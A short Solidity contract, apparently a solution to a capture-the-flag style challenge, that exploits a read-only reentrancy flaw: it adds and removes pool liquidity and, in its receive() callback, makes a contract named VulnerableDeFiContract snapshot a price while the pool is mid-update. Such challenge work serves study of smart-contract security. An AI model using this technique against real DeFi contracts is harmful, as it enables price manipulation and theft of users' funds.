//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "./ReadOnly.sol";

contract SolveReadOnly {
    ReadOnlyPool immutable pool;
    VulnerableDeFiContract immutable target;

    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _target) {
        pool = _pool;
        target = _target;
    }

    function solve() external payable {
        // add liquidity
        pool.addLiquidity{value: msg.value}();
        
        // remove liquidity
        pool.removeLiquidity();
    }

    receive() external payable {
        target.snapshotPrice();
    }
}
